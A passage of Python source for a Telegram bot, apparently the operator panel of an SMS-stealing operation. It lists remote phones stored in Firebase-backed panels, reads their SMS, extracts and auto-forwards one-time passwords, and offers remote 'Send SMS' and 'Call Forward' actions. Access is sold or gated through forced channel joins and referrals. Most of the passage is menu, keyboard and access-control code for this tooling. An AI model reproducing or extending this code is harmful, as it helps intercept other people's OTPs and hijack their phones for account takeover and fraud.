        if not is_admin and tag in ADMIN_ONLY_TAGS:
            continue
        devices.extend(GLOBAL_DEVICE_CACHE.get(tag, []))
    unique_devices = {}
    for d in devices:
        if d.id not in unique_devices: unique_devices[d.id] = d
    dev_list = list(unique_devices.values())
    dev_list.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if d.numbers else 1, -d.timestamp))
    return dev_list

async def get_panel_devices(tag: str, is_admin: bool = True) -> list[Device]:
    if not is_admin and tag in ADMIN_ONLY_TAGS:
        return []
    devices = list(GLOBAL_DEVICE_CACHE.get(tag, []))
    devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if d.numbers else 1, -d.timestamp))
    return devices

async def get_device_sms(device: Device, limit: int = SMS_LIMIT) -> list[dict]:
    data = await fb_get(device.sms_path, device.base_url)
    if not data: return []
    entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
    entries.sort(key=lambda s: int(s.get("timestamp") or 0), reverse=True)
    return entries[:limit]

# ═══════════════════════════════════════════════════════
#  MESSAGE BUILDERS & UI
# ═══════════════════════════════════════════════════════

def _reply_button(text: str, emoji_id: str, style: str = "primary") -> KeyboardButton:
    """Reply-keyboard button with premium icon + style passed via api_kwargs.
    PTB ka KeyboardButton in fields ko directly accept nahi karta —
    isliye api_kwargs me bhejte hain (warna KeyboardButton.__init__ error)."""
    return KeyboardButton(
        text,
        api_kwargs={"icon_custom_emoji_id": emoji_id, "style": style},
    )


def get_reply_menu(is_admin: bool) -> ReplyKeyboardMarkup:
    keys = [
        [
            _reply_button("Devices List", "5224607267797606837", "primary"),
            _reply_button("Search Number", "5404561694510833322", "primary"),
        ],
        [
            _reply_button("Panel Status", "6206446249181189526", "success"),
            _reply_button("Recent OTPs", "5206318837489743801", "success"),
        ],
        [
            _reply_button("All Panels", "5235588635885054955", "primary"),
            _reply_button("Keyword Search", "6206479140040743133", "primary"),
        ],
        [
            _reply_button("Number Search", "5440621591387980068", "success"),
        ],
    ]

    keys.append([
        _reply_button("My Profile", "5339233635620899144", "primary"),
        _reply_button("Help", "5253742260054409879", "primary"),
    ])

    if is_admin:
        keys.append([
            _reply_button("Bulk Search", "5246772116543512028", "danger"),
            _reply_button("◌ Bot Status", "5253742260054409879", "danger"),
        ])

        keys.append([
            _reply_button("Admin Panel", "5339233635620899144", "danger")
        ])

    return ReplyKeyboardMarkup(
        keyboard=keys,
        resize_keyboard=True
    )

def device_label(d: Device) -> str:
    return " & ".join(d.numbers) if d.numbers else f"{d.name} ({d.id[:8]})"

def device_list_header(devices: list[Device], page: int = 0) -> str:
    online = sum(1 for d in devices if d.status == "online")
    offline = len(devices) - online

    # Device list ko compact pages mein rakho
    page_size = 6
    total_pages = max(1, (len(devices) + page_size - 1) // page_size)

    page = max(0, min(page, total_pages - 1))

    active_icon = premium_emoji(
        "5224607267797606837",
        "🟢"
    )

    offline_icon = premium_emoji(
        "6206479140040743133",
        "🔴"
    )

    title_icon = premium_emoji(
        "5253742260054409879",
        "📱"
    )

    return (
        f"{title_icon} <b>DEVICES LIST</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{active_icon} <b>Active:</b> {online}    "
        f"{offline_icon} <b>Offline:</b> {offline}\n"
        f"📱 <b>Total:</b> {len(devices)}\n"
        f"📄 <b>Page:</b> {page + 1}/{total_pages}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"Select a device:"
    )


def device_list_keyboard(
    devices: list[Device],
    page: int = 0
) -> InlineKeyboardMarkup:

    page_size = 6

    total_pages = max(
        1,
        (len(devices) + page_size - 1) // page_size
    )

    page = max(0, min(page, total_pages - 1))

    start = page * page_size
    end = start + page_size

    current_devices = devices[start:end]

    rows = []

    for d in current_devices:

        # Custom emoji + button color
        if d.status == "online":
            emoji_id = "5224607267797606837"
            button_style = "success"
        else:
            emoji_id = "6206479140040743133"
            button_style = "danger"

        # IMPORTANT:
        # Do NOT put <tg-emoji> inside button text.
        # premium_button() handles the custom emoji itself.
        if d.numbers:
            number = html_escape(str(d.numbers[0]))
            label = number
        else:
            name = html_escape(str(d.name or "Unknown"))
            label = name[:25]

        rows.append([
            premium_button(
                label,
                callback_data=f"sel:{d.id}",
                emoji_id=emoji_id,
                style=button_style
            )
        ])

    # No devices
    if not current_devices:
        rows.append([
            premium_button(
                "No devices found",
                callback_data="noop",
                emoji_id="4958526153955476488",
                style="danger"
            )
        ])

    # Pagination
    nav = []

    if page > 0:
        nav.append(
            premium_button(
                "‹ Prev",
                callback_data=f"pg:{page - 1}"
            )
        )

    nav.append(
        premium_button(
            f"{page + 1}/{total_pages}",
            callback_data="noop"
        )
    )

    if page < total_pages - 1:
        nav.append(
            premium_button(
                "Next ›",
                callback_data=f"pg:{page + 1}"
            )
        )

    rows.append(nav)

    # Actions
    rows.append([
        premium_button(
            "Refresh",
            callback_data="home"
        ),
        premium_button(
            "Active Only",
            callback_data="online"
        )
    ])

    rows.append([
        premium_button(
            "All Panels",
            callback_data="panels"
        ),
        premium_button(
            "Close",
            callback_data="close_msg"
        )
    ])

    return InlineKeyboardMarkup(rows)


def online_only_keyboard(
    devices: list[Device]
) -> InlineKeyboardMarkup:

    online = [
        d for d in devices
        if d.status == "online"
    ]

    # Safety limit:
    # Telegram keyboard ko unnecessarily huge hone se bachata hai.
    page_size = 6

    rows = []

    if online:

        # Active devices only
        for d in online[:page_size]:

            icon = premium_emoji(
                "5224607267797606837",
                "🟢"
            )

            if d.numbers:
                number = html_escape(str(d.numbers[0]))
                label = f"{icon} {number}"
            else:
                name = html_escape(
                    str(d.name or "Unknown")
                )
                name = name[:25]
                label = f"{icon} {name}"

            rows.append([
                premium_button(
                    label,
                    callback_data=f"sel:{d.id}"
                )
            ])

    else:

        rows.append([
            premium_button(
                "😴 No active device",
                callback_data="noop"
            )
        ])

    rows.append([
        premium_button(
            "Refresh",
            callback_data="online"
        ),
        premium_button(
            "📋 All Devices",
            callback_data="pg:0"
        )
    ])

    rows.append([
        premium_button(
            "Close",
            callback_data="close_msg"
        )
    ])

    return InlineKeyboardMarkup(rows)


def otp_in_date_range(sms: dict) -> bool:
    today = datetime.now().date()
    yesterday = today - timedelta(days=1)
    tomorrow  = today + timedelta(days=1)
    date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate") or ""
    if date_str:
        for fmt in ("%d %b %Y %I:%M %p", "%d/%m/%Y", "%Y-%m-%d", "%d-%m-%Y", "%d %b %Y"):
            try:
                parsed = datetime.strptime(date_str.strip()[:20], fmt).date()
                return parsed in (yesterday, today, tomorrow)
            except Exception:
                continue
    ts_raw = sms.get("timestamp")
    if ts_raw:
        try:
            ts = float(ts_raw)
            if ts > 1e11: ts /= 1000
            parsed = datetime.fromtimestamp(ts).date()
            return parsed in (yesterday, today, tomorrow)
        except Exception:
            pass
    return False

def bulksearch_panels_keyboard() -> InlineKeyboardMarkup:
    rows = []
    for tag in sorted(DATABASES.keys()):
        cached = GLOBAL_DEVICE_CACHE.get(tag, [])
        online = sum(1 for d in cached if d.status == "online")
        bar = "🟢" if online > 0 else "🔴"
        safe_tag = safe_tag_for(tag)
        rows.append([premium_button(
            f"{bar} {tag} — {online} online",
            callback_data=f"bulksearch_panel:{safe_tag}"
        )])
    rows.append([premium_button("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def panels_list_keyboard(is_admin: bool = False) -> InlineKeyboardMarkup:
    rows = []
    for tag in sorted(DATABASES.keys()):
        if tag in ADMIN_ONLY_TAGS and not is_admin:
            continue
        cached = GLOBAL_DEVICE_CACHE.get(tag, [])
        total = len(cached)
        online = sum(1 for d in cached if d.status == "online")
        num_count = sum(len(d.numbers) for d in cached if d.numbers)
        bar = "🟢" if online > 0 else ("🔴" if total > 0 else "⚫")
        safe_tag = safe_tag_for(tag)
        label = f"{bar} {tag} — {num_count} numbers"
        if is_admin and tag in ADMIN_ONLY_TAGS:
            label = "🔒 " + label
        rows.append([premium_button(label, callback_data=f"panel:{safe_tag}")])
    rows.append([premium_button("Refresh", callback_data="panels"), premium_button("Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def panel_numbers_text(tag: str, devices: list[Device]) -> str:
    online = sum(1 for d in devices if d.status == "online")
    offline = len(devices) - online
    lines = [
        f"📡 <b>{tag}</b>",
        f"━━━━━━━━━━━━━━━━━━",
        f"🟢 Online: {online}  🔴 Offline: {offline}  📱 Total: {len(devices)}",
        f"━━━━━━━━━━━━━━━━━━",
    ]
    if not devices:
        lines.append("📭 Is panel mein koi device nahi mila.")
    else:
        for i, d in enumerate(devices, 1):
            icon = "🟢" if d.status == "online" else "🔴"
            batt = f"🔋{d.battery}%" if d.battery else ""
            if d.numbers:
                nums_str = " | ".join(d.numbers)
                lines.append(f"{i}. {icon} {nums_str} {batt}")
            else:
                lines.append(f"{i}. {icon} ⚙️ {d.name[:20]} {batt}")
    return "\n".join(lines)

def panel_numbers_keyboard(tag: str, devices: list[Device]) -> InlineKeyboardMarkup:
    rows = []
    for d in devices[:25]:
        icon = "🟢" if d.status == "online" else "🔴"
        if d.numbers:
            lbl = f"{icon} {d.numbers[0]}"
            if len(d.numbers) > 1:
                lbl += f" & {d.numbers[1]}"
        else:
            lbl = f"{icon} ⚙️ {d.name[:20]}"
        rows.append([premium_button(lbl, callback_data=f"sel:{d.id}")])
    rows.append([premium_button("Refresh", callback_data=f"panelref:{safe_tag_for(tag)}"),
                 premium_button("Back", callback_data="panels")])
    return InlineKeyboardMarkup(rows)

def format_sms_block(sms: dict, num_label: str) -> tuple[str, Optional[str]]:
    """
    Format a single SMS into a clean Telegram HTML block.

    Features:
    - Clean minimal layout
    - OTP highlighted with monospace/code formatting
    - Clickable URLs
    - Safe HTML escaping
    - Multilingual SMS support
    - Preserves original message line breaks
    - Works well in Telegram dark/light themes
    """

    body = str(
        sms.get("body")
        or sms.get("message")
        or sms.get("text")
        or ""
    ).strip()

    sender = str(sms.get("sender") or "Unknown").strip()
    number = str(num_label or "Unknown").strip()
    date = str(sms_date(sms) or "Unknown").strip()

    otp = extract_otp(body)

    # Escape user/SMS supplied content so Telegram HTML
    # cannot be broken by < > & characters.
    safe_sender = escape(sender)
    safe_number = escape(number)
    safe_date = escape(date)

    # Preserve SMS formatting while safely escaping HTML.
    safe_body = escape(body)

    # Convert plain URLs into clickable Telegram links.
    # Telegram supports https/http links naturally, so we don't
    # need to inject HTML around them.
    message_lines = safe_body.splitlines() or [""]

    lines = []

    # OTP
    if otp:
        safe_otp = escape(str(otp))
        lines.append(f"🔑 <b>OTP</b>  <code>{safe_otp}</code>")
        lines.append("")

    # Metadata
    lines.extend([
        f"👤 <b>From:</b> {safe_sender}",
        f"📅 <b>Date:</b> {safe_date}",
        f"📱 <b>Number:</b> {safe_number}",
        "",
        "💬 <b>Message</b>",
        "",
        "\n".join(message_lines),
        "",
        "━━━━━━━━━━━━━━━━━━",
    ])

    return "\n".join(lines), otp

def auto_forward_msg(sms: dict, num_label: str) -> str:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp = extract_otp(body)
    return (f"✨ NEW OTP RECEIVED ✨\n━━━━━━━━━━━━━━━━━━\n"
            f"│ 🔢 OTP : <code>{otp}</code>\n│ 📱 Number : {num_label}\n"
            f"│ 👤 From : {sms.get('sender','Unknown')}\n│ 📅 Date : {sms_date(sms)}\n"
            f"━━━━━━━━━━━━━━━━━━\n💬 {body}")

def device_action_keyboard(dev_id: str, back_page: int = 0) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [premium_button("Refresh OTP", callback_data=f"sel:{dev_id}"),
         premium_button("View Last 10 SMS", callback_data=f"msgs:{dev_id}")],
        [premium_button("Device Info", callback_data=f"info:{dev_id}"),
         premium_button("Send SMS", callback_data=f"ss:{dev_id}")],
        [premium_button("Call Forward", callback_data=f"cf:{dev_id}")],
        [premium_button("Back", callback_data=f"pg:{back_page}"),
         premium_button("All Panels", callback_data="panels")],
    ])

def admin_panel_text() -> str:
    fj = "ON" if FORCE_JOIN_ENABLED else "OFF"
    rg = "ON" if REFERRAL_ENABLED else "OFF"
    channel_count = len(FORCE_JOIN_CHANNELS)
    channel_text = f"{channel_count} configured" if channel_count else "Not set"
    return (
        f"{premium_emoji()} <b>ADMIN PANEL</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"👥 Total Users    : {len(all_users)}\n"
        f"✅ Allowed Users  : {len(allowed_users)}\n"
        f"📡 Active Chats   : {len(chats_registry)}\n"
        f"🗄 Connected DBs  : {len(DATABASES)}\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"🔒 Force Join     : <b>{fj}</b>\n"
        f"📢 Channels       : <b>{channel_text}</b>\n"
        f"🎁 Referral Gate  : <b>{rg}</b>\n"
        f"👥 Required Refs  : <b>{REQUIRED_REFERRALS}</b>\n"
        f"🔑 Access Gate    : <b>{'ON' if GRANT_ACCESS_REQUIRED else 'OFF (open)'}</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"🗄 Auto DB       : <b>{'ON' if AUTO_DB_ENABLED else 'OFF'}</b>"
        f" ({AUTO_DB_INTERVAL}s)\n"
        f"🎯 DB Group      : <b>{AUTO_DB_GROUP or 'Not set'}</b>\n"
        f"🗄 Backup Ch.    : <b>{AUTO_DB_BACKUP_GROUP or 'Not set'}</b>\n"
        f"🛠 Maintenance   : <b>{'ON' if MAINTENANCE_MODE else 'OFF'}</b>\n"
        "━━━━━━━━━━━━━━━━━━"
    )


def admin_keyboard() -> InlineKeyboardMarkup:
    keys = [
        [premium_button("Add Panel URL (Bulk)", callback_data="admin_add_main_db", emoji_id="5235588635885054955", style="primary")],
        [premium_button("Grant Access", callback_data="admin_grant_access", emoji_id="4958689671950369798", style="success"),
         premium_button("Revoke Access", callback_data="admin_revoke_access", emoji_id="4958900559139570572", style="danger")],
        [premium_button("User List", callback_data="admin_users", emoji_id="5372849966689566579", style="primary"),
         premium_button("Access List", callback_data="admin_access_list", emoji_id="6235476345451716705", style="primary")],
        [premium_button("Force Join", callback_data="admin_force_join", emoji_id="4956719506027185156", style="primary"),
         premium_button("Referral Gate", callback_data="admin_referral", emoji_id="5084613633418199991", style="success")],
        [premium_button("Broadcast", callback_data="admin_broadcast", emoji_id="5098265504796115765", style="primary"),
         premium_button("Refresh", callback_data="admin_refresh", emoji_id="5116414868357907335", style="primary")],
        [premium_button("Set Admin Panel", callback_data="admin_setadmin_list", emoji_id="6235476345451716705", style="primary")],
        [premium_button("Close", callback_data="close_msg", emoji_id="4958900559139570572", style="danger")],
    ]
    return InlineKeyboardMarkup(keys)

def admin_setadmin_keyboard() -> InlineKeyboardMarkup:
    rows = []
    for tag in sorted(DATABASES.keys()):
        safe_tag = safe_tag_for(tag)
        if tag in ADMIN_ONLY_TAGS:
            label = f"🔒 {tag} (Admin Only)"
        else:
            label = f"🔓 {tag}"
        rows.append([premium_button(label, callback_data=f"toggleadmin:{safe_tag}")])
    rows.append([premium_button("Back to Admin", callback_data="admin_refresh"),
                 premium_button("Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def admin_force_join_keyboard() -> InlineKeyboardMarkup:
    state = "Disable" if FORCE_JOIN_ENABLED else "Enable"
    return InlineKeyboardMarkup([
        [premium_button(
            state + " Force Join",
            callback_data="admin_fj_toggle",
            emoji_id="4956719506027185156",
            style=("danger" if FORCE_JOIN_ENABLED else "success")
        )],
        [premium_button(
            "Add Channel",
            callback_data="admin_fj_add",
            emoji_id="5098265504796115765",
            style="primary"
        )],
        [premium_button(
            "List Channels",
            callback_data="admin_fj_list",
            emoji_id="5372849966689566579",
            style="primary"
        ), premium_button(
            "Remove Channel",
            callback_data="admin_fj_remove",
            emoji_id="4956719506027185156",
            style="danger"
        )],
        [premium_button(
            "Back to Admin",
            callback_data="admin_refresh",
            emoji_id="5372849966689566579",
            style="primary"
        )],
    ])


def admin_referral_keyboard() -> InlineKeyboardMarkup:
    state = "Disable" if REFERRAL_ENABLED else "Enable"
    rows = [
        [premium_button(state + " Referral Gate", callback_data="admin_ref_toggle", emoji_id="5084613633418199991", style=("danger" if REFERRAL_ENABLED else "success"))],
        [premium_button("Set Required Referrals", callback_data="admin_ref_required", emoji_id="5372849966689566579", style="primary")],
        [premium_button("Referral Stats", callback_data="admin_ref_stats", emoji_id="5098265504796115765", style="primary")],
        [premium_button("Back to Admin", callback_data="admin_refresh", emoji_id="5372849966689566579", style="primary")],
    ]
    return InlineKeyboardMarkup(rows)


def admin_force_join_text() -> str:
    state = "ON" if FORCE_JOIN_ENABLED else "OFF"
    lines = [
        "🔒 <b>FORCE JOIN SETTINGS</b>",
        "━━━━━━━━━━━━━━━━━━",
        f"Status : <b>{state}</b>",
        f"Channels : <b>{len(FORCE_JOIN_CHANNELS)}</b>",
        ""
    ]

    if FORCE_JOIN_CHANNELS:
        for index, channel_data in enumerate(FORCE_JOIN_CHANNELS, start=1):
            channel = html_escape(str(channel_data.get("channel", "") or ""))
            url = str(channel_data.get("url", "") or "")
            url_status = "Custom URL" if url else "Auto/Public URL"
            lines.append(f"<b>{index}.</b> <code>{channel}</code> — {url_status}")
    else:
        lines.append("❌ <i>No Force Join channels configured.</i>")

    lines.extend([
        "",
        "━━━━━━━━━━━━━━━━━━",
        "User ko access ke liye configured sabhi channels join karne honge.",
        "Bot ko target channels mein admin/member-check permission ke liye add karna zaroori ho sakta hai."
    ])
    return "\n".join(lines)


def admin_referral_text() -> str:
    state = "ON" if REFERRAL_ENABLED else "OFF"
    total_qualified = sum(referral_count(uid) for uid in all_users)
    return (
        "🎁 <b>REFERRAL GATE SETTINGS</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"Status          : <b>{state}</b>\n"
        f"Required        : <b>{REQUIRED_REFERRALS}</b> referrals\n"
        f"Qualified total : <b>{total_qualified}</b>\n"
        "━━━━━━━━━━━━━━━━━━"
    )


def admin_setadmin_text() -> str:
    locked = len(ADMIN_ONLY_TAGS)
    total  = len(DATABASES)
    return (f"🔒 <b>Admin-Only Panels</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🔒 Hidden: {locked}  |  🔓 Visible: {total - locked}  |  📡 Total: {total}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Panel pe click karo → Admin-Only ON/OFF toggle ho jayega:")

async def safe_edit(query, text, reply_markup=None, parse_mode="HTML"):
    try:
        if parse_mode == "HTML":
            text = premiumize_text(text)
        await query.edit_message_text(
            text=text,
            reply_markup=reply_markup,
            parse_mode=parse_mode
        )
        return True

    except Exception as e:
        tlog(f"safe_edit ERROR: {type(e).__name__}: {e}")
        return False
    
def safe_tag_for(tag: str) -> str:
    """Collision-proof short tag for callback_data (64-byte limit).
    Purana transform lossy tha — do panels ke pehle 30 chars same hone par
    galat panel khul/delete ho sakta tha. Ab hash suffix har tag ko unique
    banata hai."""
    base = tag.replace(" ", "_").replace(":", "").replace("/", "")
    digest = hashlib.md5(tag.encode("utf-8")).hexdigest()[:6]
    return f"{base[:22]}~{digest}"


def find_tag_by_safe(safe_tag: str) -> Optional[str]:
    # New hash-based format (exact match)
    for tag in DATABASES.keys():
        if safe_tag_for(tag) == safe_tag:
            return tag
    # Backward-compat: legacy lossy format (purane messages ke buttons)
    for tag in DATABASES.keys():
        st = tag.replace(" ", "_").replace(":", "").replace("/", "")[:30]
        if st == safe_tag:
            return tag
    return None

# ═══════════════════════════════════════════════════════
#  TELEGRAM COMMAND HANDLERS
# ═══════════════════════════════════════════════════════

NO_ACCESS_TEXT = (
    "🚫 <b>Access Denied</b>\n"
    "━━━━━━━━━━━━━━━━━━\n"
    "Aapko is bot use karne ki ijazat nahi hai.\n"
    "Admin se contact karein: @showxofficial\n"
    "━━━━━━━━━━━━━━━━━━"
)


async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    user = update.effective_user
    # Auto-grant admin to the configured owner username.
    maybe_promote_admin(user)
    is_admin = maybe_promote_admin(update.effective_user) or (chat_id in ADMIN_IDS)

    if all_users.get(chat_id, {}).get("banned"):
        await update.message.reply_text("🚫 Aap banned hain.")
        return

    if not is_admin and MAINTENANCE_MODE:
        await update.message.reply_text(
            "🛠 <b>MAINTENANCE MODE</b>\n━━━━━━━━━━━━━━━━━━\n"
            "Bot abhi maintenance par hai. Thodi der baad try karein.",
            parse_mode="HTML"
        )
        return

    if chat_id not in all_users:
        all_users[chat_id] = {
            "name": user.full_name if user else "Unknown",
            "username": user.username or "" if user else "",
            "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"),
            "banned": False,
            "referrals": [],
            "referral_qualified": False,
        }
    else:
        all_users[chat_id].setdefault("referrals", [])
        all_users[chat_id].setdefault("referral_qualified", False)

    # Save/update profile information.
    if user:
        all_users[chat_id]["name"] = user.full_name
        all_users[chat_id]["username"] = user.username or ""

    # /start ref_<user_id> referral deep link.
    if ctx.args:
        payload = str(ctx.args[0]).strip()
        if payload.startswith("ref_"):
            try:
                referrer_id = int(payload[4:])
                register_referrer(chat_id, referrer_id)
            except ValueError:
                pass

    chats_registry.add(chat_id)
    save_data()

    if is_admin:
        total_devs = sum(len(v) for v in GLOBAL_DEVICE_CACHE.values())
        total_nums = sum(len(d.numbers) for v in GLOBAL_DEVICE_CACHE.values() for d in v if d.numbers)
        online_devs = sum(1 for v in GLOBAL_DEVICE_CACHE.values() for d in v if d.status == "online")
        await update.message.reply_text(
            f"{premium_emoji()} <b>OTP PANEL — ADMIN</b> {premium_emoji()}\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"👋 Welcome back, <b>{user.first_name if user else 'Admin'}</b>\n\n"
            f"📡 Panels  : <b>{len(DATABASES)}</b>\n"
            f"📱 Devices : <b>{total_devs}</b>  (🟢 {online_devs} online)\n"
            f"🔢 Numbers : <b>{total_nums}</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "<i>System online. Neeche menu se kaam shuru karein 👇</i>",
            reply_markup=get_reply_menu(True),
            parse_mode="HTML"
        )
        return

    ready, reason = await gate_state(ctx.bot, chat_id)
    if not ready:
        await send_gate_message(update, ctx, reason)
        return

    # Keep the existing manual access model as a final gate.
    if not has_access(chat_id):
        await update.message.reply_text(
            f"👋 Hello, <b>{user.first_name if user else 'User'}</b>!\n\n"
            "🚫 <b>Access Required</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Aapka account gate complete kar chuka hai.\n"
            "Lekin is bot mein manual access bhi enabled hai.\n"
            f"Your ID: <code>{chat_id}</code>",
            parse_mode="HTML"
        )
        return

    await update.message.reply_text(
        f"{premium_emoji()} <b>OTP PANEL</b> {premium_emoji()}\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"👋 Welcome, <b>{user.first_name if user else 'User'}</b>\n"
        "✅ Access verified — system online.\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "<i>Neeche menu se kaam shuru karein 👇</i>",
        reply_markup=get_reply_menu(is_admin),
        parse_mode="HTML"
    )

async def cmd_grant(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS: return
    if not ctx.args:
        await update.message.reply_text("Usage: /grant <user_id>")
        return
    try:
        target_id = int(ctx.args[0])
        grant_access(target_id)
        udata = all_users.get(target_id, {})
        name = udata.get("name", "Unknown")
        await update.message.reply_text(f"✅ Access granted to {name} ({target_id})")
        try:
            await ctx.bot.send_message(
                target_id,
                "✅ <b>Access Granted!</b>\n\nAapko bot use karne ki ijazat mil gayi.\n/start likhein.",
                parse_mode="HTML"
            )
        except: pass
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Invalid user ID.")

async def cmd_revoke(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS: return
    if not ctx.args:
        await update.message.reply_text("Usage: /revoke <user_id>")
        return
    try:
        target_id = int(ctx.args[0])
        revoke_access(target_id)
        await update.message.reply_text(f"❌ Access revoked for user {target_id}")
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Invalid user ID.")

async def cmd_setadminpanel(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS: return
    if not ctx.args:
        lines = ["🔒 <b>Admin-Only Panel Set karo</b>", "━━━━━━━━━━━━━━━━━━",
                 "Usage: <code>/setadminpanel TAG_NAME</code>", "",
                 "<b>Available Panels:</b>"]
        for tag in sorted(DATABASES.keys()):
            lock = "🔒 " if tag in ADMIN_ONLY_TAGS else "   "
            lines.append(f"{lock}<code>{tag}</code>")
        await update.message.reply_text("\n".join(lines), parse_mode="HTML")
        return
    tag = ctx.args[0].strip()
    if tag not in DATABASES:
        await update.message.reply_text(f"❌ Panel '{tag}' nahi mila. Sahi TAG naam likho.")
        return
    ADMIN_ONLY_TAGS.add(tag)
    save_data()
    await update.message.reply_text(
        f"🔒 Panel <code>{tag}</code> ab <b>Admin-Only</b> ho gaya!\n"
        f"Users ko ab ye panel nahi dikhega.",
        parse_mode="HTML"
    )

async def cmd_unsetadminpanel(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS: return
    if not ctx.args:
        if not ADMIN_ONLY_TAGS:
            await update.message.reply_text("ℹ️ Abhi koi admin-only panel set nahi hai.")
            return
        lines = ["🔓 <b>Admin-Only Panels (unlock karo):</b>", "━━━━━━━━━━━━━━━━━━",
                 "Usage: <code>/unsetadminpanel TAG_NAME</code>", ""]
        for tag in sorted(ADMIN_ONLY_TAGS):
            lines.append(f"🔒 <code>{tag}</code>")
        await update.message.reply_text("\n".join(lines), parse_mode="HTML")
        return
    tag = ctx.args[0].strip()
    if tag not in ADMIN_ONLY_TAGS:
        await update.message.reply_text(f"ℹ️ Panel '{tag}' admin-only nahi था।")
        return
    ADMIN_ONLY_TAGS.discard(tag)
    save_data()
    await update.message.reply_text(
        f"🔓 Panel <code>{tag}</code> ab <b>sab ko visible</b> ho gaya!",
        parse_mode="HTML"
    )

async def cmd_adminpanels(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS: return
    if not ADMIN_ONLY_TAGS:
        await update.message.reply_text("ℹ️ Koi panel admin-only set nahi hai abhi.")
        return
    lines = [f"🔒 <b>Admin-Only Panels ({len(ADMIN_ONLY_TAGS)} total):</b>", "━━━━━━━━━━━━━━━━━━"]
    for tag in sorted(ADMIN_ONLY_TAGS):
        lines.append(f"🔒 <code>{tag}</code>")
    lines += ["━━━━━━━━━━━━━━━━━━", "Unhide: <code>/unsetadminpanel TAG</code>"]
    await update.message.reply_text("\n".join(lines), parse_mode="HTML")

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    global FORCE_JOIN_ENABLED, FORCE_JOIN_CHANNELS, REFERRAL_ENABLED, REQUIRED_REFERRALS
    query = update.callback_query
    data = query.data or ""
    chat_id = query.message.chat_id
    is_admin = maybe_promote_admin(update.effective_user) or (chat_id in ADMIN_IDS)

    _log(f"CB {chat_id} admin={is_admin} data={data[:60]!r}")

    if all_users.get(chat_id, {}).get("banned") or is_spamming(chat_id):
        await query.answer(); return

    # Gate callbacks are available before full bot access.
    if data == "verify_join":
        await query.answer("Checking membership…")
        ready, reason = await gate_state(ctx.bot, chat_id)
        if reason == "force_join":
            await safe_edit(
                query,
                "🔒 <b>JOIN REQUIRED</b>\n━━━━━━━━━━━━━━━━━━\nSabhi required channels join nahi mile. Pehle sabhi channels join karein, phir Verify dabayein.",
                reply_markup=force_join_keyboard()
            )
            return
        if reason == "referrals":
            await safe_edit(
                query,
                f"🎁 <b>REFERRAL UNLOCK</b>\n━━━━━━━━━━━━━━━━━━\nValid referrals: <b>{referral_count(chat_id)}/{REQUIRED_REFERRALS}</b>\n━━━━━━━━━━━━━━━━━━",
                reply_markup=referral_gate_keyboard(chat_id)
            )
            return
        if ready and has_access(chat_id):
            await safe_edit(query, "✅ <b>Verified!</b>\n/start karke bot menu open karein.", reply_markup=None)
        elif ready:
            await safe_edit(query, f"✅ Gate complete.\nYour ID: <code>{chat_id}</code>\nAdmin access required.", reply_markup=None)
        return

    if data == "gate_refresh":
        await query.answer("Refreshing…")
        ready, reason = await gate_state(ctx.bot, chat_id)
        if reason == "force_join":
            await safe_edit(query, "🔒 <b>JOIN REQUIRED</b>\n━━━━━━━━━━━━━━━━━━\nSabhi channels join karke Verify dabayein.", reply_markup=force_join_keyboard())
        elif reason == "referrals":
            await safe_edit(query, f"🎁 <b>REFERRAL UNLOCK</b>\n━━━━━━━━━━━━━━━━━━\nProgress: <b>{referral_count(chat_id)}/{REQUIRED_REFERRALS}</b>", reply_markup=referral_gate_keyboard(chat_id))
        elif ready and has_access(chat_id):
            await safe_edit(query, "✅ <b>Unlocked</b>\n/start karke bot menu open karein.")
        else:
            await safe_edit(query, f"✅ Gate complete.\nYour ID: <code>{chat_id}</code>\nAdmin access required.")
        return

    if data == "my_ref":
        await query.answer()
        link = build_bot_referral_link(chat_id)
        await safe_edit(
            query,
            f"🎁 <b>MY REFERRALS</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"Qualified: <b>{referral_count(chat_id)}/{REQUIRED_REFERRALS}</b>\n\n"
            f"Your referral link:\n<code>{html_escape(link)}</code>\n\n"
            "Referral valid tab hoga jab referred user required join check complete karega.",
            reply_markup=referral_gate_keyboard(chat_id)
        )
        return

    if data == "noop": await query.answer(); return

    # Extra feature dispatcher (admin suite + user suite)
    try:
        if await extra_callbacks(update, ctx, data, chat_id, is_admin):
            return
    except Exception as e:
